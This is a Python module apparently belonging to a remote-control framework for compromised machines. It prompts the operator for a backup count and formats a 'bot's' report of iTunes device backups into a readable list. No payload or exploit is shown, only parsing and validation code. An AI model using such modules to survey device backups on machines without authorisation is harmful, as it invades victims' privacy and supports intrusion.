# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    DEFAULT_COUNT = 10
    MAX_COUNT = 500

    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Show a list of devices backed up by iTunes (optionally fetch all).",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Backup limit (leave empty for {}, max {}; enter 'all' to fetch every device): ".format(
                self.DEFAULT_COUNT, self.MAX_COUNT
            )
        ]

    def setup(self, set_options):
        raw = (set_options[0] or "").strip()

        if not raw:
            backup_count = self.DEFAULT_COUNT
        elif raw.lower() in ("all", "*"):
            backup_count = None  # None means: fetch every available backup.
        elif not raw.isdigit() or int(raw) <= 0:
            self._view.display_error("Invalid backup count, must be a positive whole number or 'all'.")
            return False, None
        else:
            backup_count = min(int(raw), self.MAX_COUNT)

        return True, {
            "backup_count": backup_count
        }

    def process_response(self, response, response_options):
        """Parses and clearly lists the iTunes backup report returned by the bot."""
        str_response = ""
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        self._view.output_separator()

        stripped = str_response.strip()
        if not stripped:
            self._view.output("The bot returned no backup data.", "info")
            return

        if "no local backups found" in stripped.lower():
            self._view.output("No local iTunes backups were found on the bot.", "info")
            return

        self._view.output("== iTunes backups ==")

        block = {}
        device_index = 0
        saw_device = False

        def flush_block():
            nonlocal block, device_index, saw_device
            if block:
                device_index += 1
                saw_device = True
                self._view.output("[+] Device {}".format(device_index))
                for key, value in block.items():
                    self._view.output("  {}: {}".format(key, value or "(unknown)"))
            block = {}

        for raw_line in stripped.splitlines():
            line = raw_line.strip()
            if not line:
                continue

            if "looking for backups" in line.lower():
                continue
            if line.startswith("[+] Device:"):
                flush_block()
                continue

            if ":" in line:
                key, _, value = line.partition(":")
                block[key.strip()] = value.strip()
            else:
                self._view.output(line, "info")

        flush_block()

        if not saw_device and not block:
            # No structured rows detected, print the raw report for transparency.
            self._view.output(str_response)
